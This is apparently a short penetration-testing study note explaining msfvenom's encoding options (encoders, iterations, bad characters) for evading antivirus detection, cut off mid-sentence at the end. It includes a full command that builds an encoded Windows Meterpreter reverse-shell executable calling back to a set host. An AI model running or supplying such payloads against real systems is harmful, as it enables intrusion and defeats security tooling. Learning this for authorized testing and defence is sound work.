**Core Concept:** Encoding a payload changes its signature to **evade antivirus (AV)** detection. It does **not** encrypt the payload, so it's not a secure obfuscation method.

#### **Essential Flags & Options:**

- `-e, --encoder <encoder>`: Specifies the encoder to use.
    
    - **Common Encoders:** `x86/shikata_ga_nai` (polymorphic, very popular), `cmd/powershell_base64`
        
- `-i, --iterations <count>`: Number of times to encode the payload. More iterations can help with evasion but are not a guarantee.
    
- `-b, --bad-chars <list>`: Avoid using specific "bad characters" in the payload that might break it (e.g., null bytes `\x00`, newlines `\x0a`).
    

**How it Works:** The encoder adds a small "decoder stub" to the beginning of the payload. When executed, the stub
decodes the main payload in memory and runs it.

**Practical Example:**  
Generate the same Windows payload, but encode it 5 times using `shikata_ga_nai`:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_payload.exe
```

**Important Caveat:** Encoding alone is often insufficient against modern AV. It should be combined with other techniques
